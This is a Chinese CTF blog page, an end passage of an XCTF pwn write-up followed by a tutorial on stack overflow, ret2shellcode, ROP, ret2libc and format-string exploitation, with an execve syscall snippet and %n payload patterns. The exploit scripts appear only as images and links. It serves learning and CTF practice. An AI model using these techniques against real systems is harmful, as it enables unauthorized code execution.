<p>&ensp;&ensp;&ensp;&ensp;<strong>2、拖入到<code>IDA</code>当中，进入到<code>main</code>函数，会发现程序首先输出一些信息，然后调用<code>read</code>函数获取输入，之后比较<code>dword_60106C</code>变量是否等于<code>0x6E756161</code>，如果相等，这调用<code>sub_400686</code>函数，跟进<code>sub_400686</code>函数，会发现该函数作用为输出<code>flag</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/50.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/51.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>3、有了上面的分析，那么解题的思路就很明显了，利用<code>read</code>函数溢出覆盖<code>dword_60106C</code>变量为<code>0x6E756161</code>，仔细观察一下，会发现<code>unk_601068</code>变量增长<code>4</code>个字节到<code>dword_60106C</code>，既偏移量为<code>4</code>，最后<code>exp</code>执行结果如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/52.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//xctf_pwn_novice_area/53.png">  </p>
<hr>
<h1 id="十二、相关链接"><a href="#十二、相关链接" class="headerlink" title="十二、相关链接"></a>十二、相关链接</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>题目和<code>exp</code>的<code>github</code>链接: <a target="_blank" rel="noopener" href="https://github.com/windy-purple/XCTF_PWN">https://github.com/windy-purple/XCTF_PWN</a></strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2021/12/26/03/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/26/03/" class="post-title-link" itemprop="url">PWN学习总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-26 23:02:03" itemprop="dateCreated datePublished" datetime="2021-12-26T23:02:03+08:00">2021-12-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-12 23:10:17" itemprop="dateModified" datetime="2024-11-12T23:10:17+08:00">2024-11-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>14 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="一、栈溢出原理"><a href="#一、栈溢出原理" class="headerlink" title="一、栈溢出原理"></a>一、栈溢出原理</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>什么是栈溢出？栈溢出就是缓冲区溢出的一种。 由于缓冲区溢出而使得有用的存储单元被改写,往往会引发不可预料的后果。程序在运行过程中，为了临时存取数据的需要，一般都要分配一些内存空间，通常称这些空间为缓冲区。如果向缓冲区中写入超过其本身长度的数据，以致于缓冲区无法容纳，就会造成缓冲区以外的存储单元被改写，这种现象就称为缓冲区溢出。缓冲区长度一般与用户自己定义的缓冲变量的类型有关。(PS:摘自百度百科)</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>简单来说，就是程序没有检查用户输入的数据长度，导致攻击者覆盖栈上不是程序希望写入的地方，比如说返回地址。(PS:本人是这么理解的，如有问题，还请斧正)</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>在x86中，对于调用一个函数，栈的变化如下：首先，将被调用的函数的参数从右到左依次压入栈中，然后将被调用的函数的返回地址压入栈中，然后跳转到被调用函数的地址去，在被调用的函数中，首先将<code>ebp</code>(这时的<code>ebp</code>是调用者的<code>ebp</code>)压入栈中，最后，将此时的栈顶<code>esp</code>赋值给<code>ebp</code>寄存器(此时的<code>ebp</code>便是被调用函数的栈底了)</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>以一个实际程序为例，源码如下所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/1.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>对于进入<code>test</code>函数后，栈的变化情况如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/1.jpg">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>接着利用gdb调试验证栈的情况如上图所示，首先在<code>test</code>函数处打下断点，然后<code>start</code>命令将程序运行到<code>main</code>函数开头处，查看一下此时的<code>ebp</code>寄存器的值和<code>call test</code>指令后下一条指令的地址，这里可以看到此时<code>ebp</code>寄存器的值为<code>0xffffd1d8</code>，<code>call test</code>指令后的下一条指令地址为<code>0x565561f2</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/2.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/3.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/4.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>然后运行<code>r</code>命令，进入<code>test</code>函数内部，使用<code>x</code>命令查看此时的栈情况，可以发现栈的情况如上图示意图一样，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/5.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/6.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>在<code>test</code>函数内部，有个<code>ver</code>字符数组，在上面的源码中，我们对其进行了手动赋值，假如该数组通过<code>strcpy</code>等函数完成赋值，并且赋值的字符串由用户输入，那么在用户输入的字符串超过<code>12</code>个字节大小之后，<code>ver</code>数组就会接着往高地址增长，在这其中，可以覆盖掉<code>test</code>函数的返回地址、<code>main</code>函数的<code>ebp</code>等等，这就是栈溢出漏洞。下面来看一个具体的程序实例，有漏洞的程序源码如下所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/7.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>从源码中可以看到，程序对用户的输入无限制，并且<code>strcpy</code>函数拷贝也无限制，就造成了栈溢出漏洞，下面使用gdb确定偏移地址和<code>getshell</code>函数的首地址，首先断点打在<code>call strcpy</code>的前一行，查看此时的<code>buf</code>数组的地址，也就是<code>eax</code>寄存器的值，再看<code>ebp</code>寄存器的值，发现其两者相距<code>0x10</code>个字节，加上<code>ebp</code> 4个字节，也就是<code>0x14</code>个字节即可到达返回地址，再利用命令<code>disassemble getshell</code>查看<code>getshell</code>函数的首地址，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/8.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/9.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>有了偏移量和<code>getshell</code>函数地址就可以写<code>exp</code>了，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/10.png"></p>
<hr>
<h1 id="二、ret2shellcode"><a href="#二、ret2shellcode" class="headerlink" title="二、ret2shellcode"></a>二、ret2shellcode</h1><p>&ensp;&ensp;&ensp;&ensp;<strong><code>ret2shellcode</code>就是直接部署一段<code>shellcode</code>到栈上或者内存其他位置，当然，要使用的前提是，部署的<code>shellcode</code>所在的位置要具有执行权限，要关闭地址随机化，下面以一道ctf题为例，题目来自<code>ctfhub</code>，首先下载好题目，丢到ida里面反编译一下，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/11.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>可以看到，<code>read</code>函数允许输入的大小为<code>0x400</code>，远大于<code>buf</code>数组的长度，这就造成了栈溢出，并且距离<code>ebp</code>偏移距离为<code>0x10</code>。利用<code>checksec</code>检查一下程序，啥保护都没开，利用<code>file</code>查看一下，是<code>64位</code>的，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/14.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>有了偏移量，并且题目输出给出了<code>buf</code>数组的地址，那么就可以写<code>exp</code>了，首先外面用<code>socat</code>将程序发布到某个端口上去，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/12.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>最后执行<code>exp</code>即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/13.png">  </p>
<hr>
<h1 id="三、Rop"><a href="#三、Rop" class="headerlink" title="三、Rop"></a>三、Rop</h1><p>&ensp;&ensp;&ensp;&ensp;<strong><code>ROP</code>的全称是<code>Return Oriented Programming</code>，简单来说就是修改返回地址，指向内存中的指令片段，也就是<code>gadget</code>，通过<code>ret</code>指令将程序的控制器拿在手里。例如一个存在栈溢出的程序，再将返回地址覆盖为<code>pop eax;ret</code>指令地址后，会将返回地址后的4个字节弹到<code>eax</code>寄存器中，然后<code>esp+4</code>，之后又将栈上4个字节弹到<code>eip</code>寄存器中去，而攻击者要做的就是给栈上返回地址后面覆盖要赋给<code>eax</code>的值，下一条<code>gadget</code>的地址，通过这种方式就组合成了一条<code>rop</code>攻击链，栈情况如下图所示(PS：下面图片来自<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25892385">https://zhuanlan.zhihu.com/p/25892385</a>文章中)：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/23.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>下面以一道ctf题为例(PS:题目来自<code>ctfwiki</code>)，首先下载好题目，然后查看一下常规信息，可以发现为<code>x86</code>架构，开启了<code>NX</code>，也就是说无法在栈上执行<code>shellcode</code>，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/15.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>丢到<code>IDA</code>里面去反编译一下，可以发现是<code>gets</code>函数引起的栈溢出漏洞，并且没有直接可以<code>getshell</code>的函数，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/16.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>那么可以考虑利用<code>rop</code>来<code>getshell</code>，这是一个32为的程序，我们可以通过系统调用来获取<code>shell</code>，常规的执行命令函数的系统调用汇编代码如下图所示：</strong>  </p>
<pre><code>mov eax, 0xb  
mov ebx, &quot;/bin/sh&quot;  
mov ecx, 0  
mov edx, 0  
int 80  
</code></pre>
<p>&ensp;&ensp;&ensp;&ensp;<strong>要给<code>eax</code>赋值，那么我们寻找<code>pop eax;ret</code>之类的代码片段，之所以要有<code>ret</code>指令，是为了要把程序的控制权拿在手中，给其他寄存器赋值也类似，接下来利用<code>ROPgadget</code>工具来寻找相应的代码片段，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/17.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/18.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>在这里，我们在寻找控制<code>ecx</code>寄存器的代码片段中，发现可以同时控制<code>ebx</code>、<code>ecx</code>以及<code>edx</code>的一条指令，使用它即可(在图中地址为<code>0x806eb90</code>)，接下来，我们需要<code>/bin/sh</code>字符串的地址，打开<code>IDA</code>，键入<code>shift+F12</code>，发现了<code>/bin/sh</code>字符串的地址，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/19.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>当然，我们还需要最重要的偏移量数据，使用<code>gdb</code>调试程序，将断点打在调用<code>gets</code>函数处，然后<code>r</code>，查看当前<code>eax</code>与<code>ebp</code>的距离为<code>0x68</code>(PS:此时<code>eax</code>存放着<code>v4</code>数组的首地址)，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/21.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>所有我们编写<code>exp</code>的数据都有了，接下来使用<code>socat</code>将程序发布到某个端口上去，然后执行<code>exp</code>即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/20.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/22.png">  </p>
<hr>
<h1 id="四、ret2libc"><a href="#四、ret2libc" class="headerlink" title="四、ret2libc"></a>四、ret2libc</h1><p>&ensp;&ensp;&ensp;&ensp;<strong><code>ret2libc</code>从名字上来看，就是通过覆盖返回地址为<code>libc</code>库中的函数来<code>getshell</code>的一种技术，通常来说，我们会选择<code>system</code>等函数来<code>getshell</code>，但是一般无法获取到这些函数在内存中的绝对地址的，这就需要通过<code>got</code>和<code>plt</code>表泄露以经加载的函数在内存中的地址然后减去其偏移地址，从而拿到<code>libc</code>库的基地址，然后加上<code>system</code>等函数的偏移地址，从而得到<code>system</code>等函数在内存中的地址。</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong><code>plt</code>表和<code>got</code>表是保存程序动态链接的函数地址，程序通过查询<code>plt</code>表获取函数在<code>got</code>表中保存的位置，<code>plt</code>表就相当于一个索引数组，指向<code>got</code>表，程序获取到<code>plt</code>表中相关位置之后，然后查询<code>got</code>表获取到函数地址，之后跳转到该地址去。下面以一道ctf题为例，题目来自<code>ctfwiki</code>，如下所示：</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>首先还是老一套，查看一下程序信息，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/25.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>可以发现，程序是32位的，并且开启了堆栈不可执行保护，也就是说不可以将<code>shellcode</code>写入栈上执行。再将程序拖进IDA里面看一下，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/24.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>可以看到，溢出点在<code>gets</code>函数，下面用<code>gdb</code>调试一下寻找到偏移量，首先断点下载<code>gets</code>函数，然后查看此时<code>eax</code>与<code>ebp</code>的距离，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/26.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>可以看到，此时<code>eax</code>距离<code>ebp</code>一共为<code>108</code>个字节，再加上这是32位程序，<code>ebp</code>本身占4个字节，也就是说，填充<code>108 + 4 = 112</code>字节后，便是返回地址，找到返回地址后，便是找到<code>system</code>函数地址</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>这里通过访问<code>got</code>表来拿到一个已经运行过的函数在内存中的地址，在linux中，如果一个函数被调用运行过，那么它的真实地址就会被写进<code>got</code>表中，我们可以通过打印函数将其打印出来，获取其地址，之后通过该地址的后三位(PS:之所以找后三位，是因为即使开启了<code>aslr</code>也不会影响低12位的地址)来确定<code>libc</code>的版本(PS:可以通过在线网站<a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a>来查询)，从而获取该版本的<code>libc</code>库中函数的偏移地址，最后<code>泄露地址 - 偏移地址</code>即可得到<code>libc</code>的基地址。然后<code>libc基地址 + 该版本libc库中system偏移地址</code>即可得到<code>system</code>函数在内存中的地址，同理，<code>/bin/sh</code>字符串也是一样的，此处选用的泄露函数地址的函数为<code>puts</code>函数，将程序利用<code>socat</code>发布后，最后<code>exp</code>结果如下图所示(PS:程序最好运行在ubuntu上，经过实际测试，kali上失败，下同)：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/27.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/28.png"></p>
<hr>
<h1 id="五、格式化字符串"><a href="#五、格式化字符串" class="headerlink" title="五、格式化字符串"></a>五、格式化字符串</h1><p>&ensp;&ensp;&ensp;&ensp;<strong>格式化字符串漏洞，个人理解就是格式字符串参数与其余参数的个数不匹配造成的，网上将原理的文章一大堆，这里就不在重复了。</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>对于格式化字符串漏洞，可以做到读取任意地址的值，也可以往任意地址写入任意值。</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>对于利用格式化字符串漏洞读取任意地址的值，首先需要确定偏移量，此处的偏移量不是值上面栈溢出的偏移量，而是格式化字符串函数参数的地址相对于格式化字符串参数的偏移量，确定偏移量可以利用形如<code>AAAA%n$x</code>(PS:里面的<code>n</code>就是偏移量)的格式化字符串参数来确定，或者利用<code>AAAA%x%x%x%x%x%x%x%x...</code>(PS:这里也可以使用<code>%p</code>来，但为了防止读到不可读的地址导致程序崩溃，还是推荐使用<code>%x</code>来读取)这种形式来确定，确定的偏移量之后，即可通过<code>addr%n$x</code>来读取任意地址的值(PS:这里的<code>addr</code>指要读取的地址，<code>n</code>为偏移量，当然<code>addr</code>也可以写在后面，把<code>n</code>加<code>1</code>即可，因为<code>%n$x</code>是第一个参数，<code>addr</code>自然是第二个参数，所以<code>n</code>要加上<code>1</code>)</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>对于利用格式化字符串漏洞往任意地址写入值，也是需要先确定偏移量，方法和上面一样，写主要利用<code>%n</code>，<code>%n</code>作用为将前面所写字节数写入指定地址，我们可以利用形如<code>addr%kc%n$n</code>这种形式写入，其中<code>addr</code>为要写入的地址，<code>k</code>为要写入的大小(PS:这里需要减去<code>addr</code>所占用的字节数)，<code>n</code>为偏移量，<code>$n</code>表示写入四个字节，当然，也可以使用<code>$hn</code>写入双字节，可以使用<code>$hhn</code>写入一个字节，当然，确定好偏移量之后，最简单的方法是使用<code>pwntools</code>提供的函数即可</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>下面以一道ctf题举例，题目来自<code>ctfwik</code>，首先下载好题目，解压后，丢到<code>kali</code>里面去，看一下常规信息,可以发现，该程序为<code>32位</code>，开了<code>NX</code>等，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/29.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>丢到<code>IDA</code>中反编译一下，可以发现程序实现了类似<code>ftp</code>的功能，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/30.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>首先程序调用了<code>ask_usename</code>和<code>ask_password</code>两个函数获取一个密码，密码就是将<code>sysbdmin</code>字符串加一，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/31.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/32.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>然后程序获取命令，命令有<code>get</code>、<code>put</code>、<code>dir</code>三个命令，获取命令之后，便执行相应的功能，首先来看一下<code>put</code>对应的功能函数，该函数首先要求用户输入一个字符串作为文件名，然后要求用户再输入一个字符串作为文件内容，该函数没什么漏洞，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/33.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>接下来再看一下<code>dir</code>对应的功能函数，该函数作用就是将所有文件名打印出来，也没有什么漏洞，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/34.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>最后来看一下<code>get</code>对应的功能函数，该函数首先要求用户输入文件名，然后将文件名对应的内容拷贝到一个数组中去，最后直接将该数组作为参数传入到<code>printf</code>函数中去，典型的格式化字符串漏洞，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/35.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>通过以上的代码分析，解决该ctf的思路已经很明显了，我们可以首先利用<code>put</code>建立一个文件，将<code>payload</code>写入到该文件中去，之后调用<code>get</code>指令读取该文件，触发格式化字符串漏洞。首先我们先确定偏移量，这里使用<code>BBBB%x....</code>来确定，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/36.png">  </p>
<p>&ensp;&ensp;&ensp;&ensp;<strong>我们可以通过上图发现，偏移量为<code>7</code>，那么怎么<code>getshell</code>喃，我们可以通过修改<code>got</code>表来实现，将<code>dir</code>指令对应的功能函数中的<code>puts</code>函数修改为<code>system</code>函数的地址，这样调用<code>dir</code>指令后，里面的<code>puts</code>函数实际上会指向<code>system</code>函数，我们通过提前新建一个名为<code>/bon/sh;</code>的文件，即可解决参数的问题，这里怎么写前面<code>ret2libc</code>已经讲了，不在重复，最后使用<code>socat</code>发布程序，指向<code>exp</code>即可，如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/37.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//pwn_study_summary/38.png"></p>
<hr>
<h1 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h1><p>&ensp;&ensp;<strong><code>exp</code>脚本和题目<code>github</code>链接:<a target="_blank" rel="noopener" href="https://github.com/windy-purple/pwn_study_summary">https://github.com/windy-purple/pwn_study_summary</a></strong>  </p>
<p>&ensp;&ensp;<strong>参考链接：</strong>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/11122229.html">https://www.cnblogs.com/ichunqiu/p/11122229.html</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/11156155.html">https://www.cnblogs.com/ichunqiu/p/11156155.html</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/11162515.html">https://www.cnblogs.com/ichunqiu/p/11162515.html</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-4225.html">http://drops.xmd5.com/static/drops/tips-4225.html</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoi123/article/details/80899155">https://blog.csdn.net/xiaoi123/article/details/80899155</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-230148.htm">https://bbs.pediy.com/thread-230148.htm</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/">https://sploitfun.wordpress.com/2015/</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/187b810e78d2">https://www.jianshu.com/p/187b810e78d2</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25816426">https://zhuanlan.zhihu.com/p/25816426</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Donoy/p/5690402.html">https://www.cnblogs.com/Donoy/p/5690402.html</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-259723.htm">https://bbs.pediy.com/thread-259723.htm</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25892385">https://zhuanlan.zhihu.com/p/25892385</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="http://events.jianshu.io/p/9214e84139eb">http://events.jianshu.io/p/9214e84139eb</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wulitaotao/p/13909451.html">https://www.cnblogs.com/wulitaotao/p/13909451.html</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hktk1643/p/15218090.html">https://www.cnblogs.com/hktk1643/p/15218090.html</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367387964">https://zhuanlan.zhihu.com/p/367387964</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoi123/article/details/80985646">https://blog.csdn.net/xiaoi123/article/details/80985646</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/windows/readme/">https://ctf-wiki.org/pwn/windows/readme/</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41918771/article/details/90665950">https://blog.csdn.net/qq_41918771&#x2F;article&#x2F;details&#x2F;90665950</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-253638.htm">https://bbs.pediy.com/thread-253638.htm</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/83835">https://www.anquanke.com/post/id/83835</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-254869.htm">https://bbs.pediy.com/thread-254869.htm</a>  </p>
<p>&ensp;&ensp;&ensp;&ensp;<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-262816.htm">https://bbs.pediy.com/thread-262816.htm</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2021/11/22/02/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="windy_ll">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="windy_ll">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/22/02/" class="post-title-link" itemprop="url">CVE-2020-3580漏洞复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-11-22 22:08:02" itemprop="dateCreated datePublished" datetime="2021-11-22T22:08:02+08:00">2021-11-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-12 23:08:43" itemprop="dateModified" datetime="2024-11-12T23:08:43+08:00">2024-11-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>661</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
